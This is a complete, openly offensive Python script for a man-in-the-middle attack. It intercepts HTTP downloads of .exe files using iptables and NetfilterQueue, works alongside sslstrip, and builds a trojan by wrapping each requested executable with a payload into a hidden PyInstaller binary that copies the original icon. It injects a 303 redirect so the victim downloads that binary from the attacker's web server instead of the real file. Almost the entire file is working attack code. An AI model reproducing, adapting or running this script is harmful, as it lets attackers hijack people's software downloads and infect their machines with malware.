#!/usr/bin/python3
#________________________________________________________________
# Author - Zachary Lamb
# Description -
        # A script to replace downloads while MITM
#________________________________________________________________

import scapy.all as scapy
import netfilterqueue
import fileinput
import subprocess
import datetime
import time
import sys
import re
import os

class FileStrip:
	def  __init__(self, ip, payload):
		self.edit_tables()
		self.ip = ip
		self.payload = payload
		self.url = ""
		self.exename = ""
		self.pyname = ""
		self.valid_url = ""
		self.name = ""
		self.successful_urls = []
		self.ack_list = []


	def edit_tables(self):
		print("\033[94m [+]\033[39m Creating IP tables")
		time.sleep(1)
		subprocess.call("clear",shell=True)
		#subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000",shell=True)
		subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
		subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True) # Use INPUT and OUTPUT chains when dealing with sslstrip
		#subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)

	def cleanup(self, _exename, _pyname, _specname):
		subprocess.call("rm /root/Python_Projects/Kali/"+_exename,shell=True)
		subprocess.call("rm /root/Python_Projects/Kali/"+_pyname,shell=True)
		subprocess.call("rm /root/Python_Projects/Kali/"+_specname,shell=True)
		subprocess.call("rm /root/Python_Projects/Kali/icon.ico",shell=True)

	def set_load(self, packet, load):
		packet[scapy.Raw].load = load
		del packet[scapy.IP].len
		del packet[scapy.IP].chksum
		del packet[scapy.TCP].chksum
		return packet

	def modify_file(self, _pyname, _exename, _url, _payload):
		link = re.findall('.+.exe',_url)[0]
		subprocess.call("iptables --flush",shell=True)
		subprocess.call("wget -O /root/Python_Projects/Kali/"+_exename+" "+ link,shell=True)
		#subprocess.call("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000",shell=True)
		subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0",shell=True)
		subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0",shell=True)
		#subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
		subprocess.call("wrestool -x -t 14 /root/Python_Projects/Kali/"+ _exename + " > /root/Python_Projects/Kali/icon.ico",shell=True)
		with open("/root/Python_Projects/Kali/"+_pyname,"w") as new_file: # creating python file here
			with open(_payload,"r") as old_file:
				for line in old_file:
					if "name = sys._MEIPASS + \"NAME\"" in line:
						new_file.write("name = sys._MEIPASS + \"/" + _exename + "\"\n")
					else:
						new_file.write(line)
		print("\033[94m [+] \033[39mGenerating trojan")
		os.chdir("/root/Python_Projects/Kali")
		os.system("[ -f /root/Python_Projects/Kali/icon.ico ] || wine C:/Python27/python.exe C:/Python27/Scripts/pyinstaller-script.py --distpath /var/www/html/malicious/dist --add-data \"/root/Python_Projects/Kali/"+_exename+";.\" --icon /root/Python_Projects/Kali/icon.ico --onefile --noconsole /root/Python_Projects/Kali/"+_pyname)
		os.system("[ -f /root/Python_Projects/Kali/icon.ico ] && wine C:/Python27/python.exe C:/Python27/Scripts/pyinstaller-script.py --distpath /var/www/html/malicious/dist --add-data \"/root/Python_Projects/Kali/"+_exename+";.\" --icon /root/Python_Projects/Kali/basic_icon.ico --onefile --noconsole /root/Python_Projects/Kali/"+_pyname)
		_specname = _pyname.strip('.py')
		_specname = _specname + ".spec"
		self.cleanup(_exename, _pyname, _specname)

	def filter_dns(self, packet):
		try:
			scapy_packet = scapy.IP(packet.get_payload())
			if scapy_packet.haslayer(scapy.Raw): # DNSRR - DNS response | DNSQR - DNS request
				if scapy_packet.haslayer(scapy.TCP):
					if scapy_packet[scapy.TCP].dport == 10000: # Normally would be 80 but 10000 because of sslstrip
						if self.ip not in str(scapy_packet[scapy.Raw].load):
							if not any(ext in str(scapy_packet[scapy.Raw].load) for ext in self.successful_urls):
								if ".exelator" not in str(scapy_packet[scapy.Raw].load):
									#if "Upgrade-Insecure-Requests: 1" in str(scapy_packet[scapy.Raw].load):
										#downgrade_request(scapy_packet)
									if ".exe" in str(scapy_packet[scapy.Raw].load):
										currentDT=datetime.datetime.now()
										print(currentDT.strftime("%H:%M:%S"))
										spl = str(scapy_packet[scapy.Raw].load).split(" ")
										try:
											self.url = spl[1]
											self.valid_url = spl[3].split("\\")[0]+spl[1]
											index = self.url.split("/")[-1].find(".exe")
											self.exename = self.url.split("/")[-1][:index+4]
											self.pyname = self.exename[:-4]+".py"
										except:
											pass
										print("FILE: " + self.exename)
										print("URL: " + self.valid_url)
										print("\033[94m [+] \033[39mExecutable download request made")
										self.ack_list.append(scapy_packet[scapy.TCP].ack)
					elif scapy_packet[scapy.TCP].sport == 10000: # Normally would be 80 but 10000 because of sslstrip
						if scapy_packet[scapy.TCP].seq in self.ack_list:
							print("\033[94m [+] \033[39mIntercepting HTTP Response")
							self.ack_list.remove(scapy_packet[scapy.TCP].seq)
							self.new_load = "HTTP/1.1 303 See Other\nLocation: http://"+self.ip+"/malicious/dist/"+self.exename+"\n\n\n\n\n"
							try:
								modified_packet = self.set_load(scapy_packet,self.new_load)
								packet.set_payload(bytes(modified_packet))
								self.modify_file(self.pyname, self.exename, self.valid_url, self.payload)
								self.successful_urls.append(self.url)
								print("\033[92m [+] \033[39mSuccessfully replaced download\n")
								#subprocess.call("iptables --flush", shell=True)
								#subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0",shell=True)
							except:
								print("\033[91m [+] \033[39mFailed to replace download\n")
		except KeyboardInterrupt:
			try:
				print("\033[94m [+] Keyboard Interrupt: \033[39m Flushing IP tables and cleaning up server...")
				subprocess.call("rm -rf /var/www/html/malicious/*")
			except:
				pass
			subprocess.call("iptables --flush",shell=True)
			exit()
		packet.accept()

	def execute(self):
		print("\033[94m [+] \033[39m Listening for download requests")
		print("__________________________________________\n")
		try:
			self.queue = netfilterqueue.NetfilterQueue()
			self.queue.bind(0, self.filter_dns)
			self.queue.run()
		except KeyboardInterrupt:
			print("\033[94m [+] Keyboard Interrupt: \033[39m Flushing IP tables and cleaning up server...")
			subprocess.call("iptables --flush",shell=True)

if __name__ == "__main__":
	filestrip = FileStrip("10.0.0.200","/root/Python_Projects/Kali/trojan_filestrip.py")
	filestrip.execute()
